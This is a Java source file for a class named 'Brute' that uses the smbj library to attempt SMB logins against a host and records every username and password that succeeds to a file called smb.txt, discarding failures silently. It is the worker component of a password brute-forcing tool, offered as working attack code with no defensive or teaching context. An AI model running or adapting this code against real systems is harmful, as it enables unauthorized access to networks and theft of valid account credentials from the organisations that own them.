import com.hierynomus.smbj.SMBClient;
import com.hierynomus.smbj.auth.AuthenticationContext;
import com.hierynomus.smbj.connection.Connection;
import com.hierynomus.smbj.session.Session;

import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;

class Brute implements Runnable {

    PrintWriter fw;
    String host;
    String userName;
    String password;
    String domain;

    public Brute(String host, String userName, String password, String domain) throws IOException {
        this.host = host;
        this.userName = userName;
        this.password = password;
        this.domain = domain;
        fw = new PrintWriter(new BufferedWriter(new FileWriter("smb.txt", true)));
    }

    public void login() throws IOException {
        SMBClient client = new SMBClient();
        try (Connection connection = client.connect(this.host)) {
            AuthenticationContext ac = new AuthenticationContext(this.userName, this.password.toCharArray(), this.domain);
            Session session = connection.authenticate(ac);

            String success = this.host + " " + userName + " " + password;
            this.fw.println(success);
            System.out.println(success);
        }
        catch(Exception e) {
            // nothing here
//            this.fw.println(this.host + " NOPE " + userName + " " + password);
        }
    }

    @Override
    public void run() {
        System.out.println("Checking:" + host);
        try {
            this.login();
        } catch (IOException e) {
            e.printStackTrace();
        }
        fw.close();
    }
}
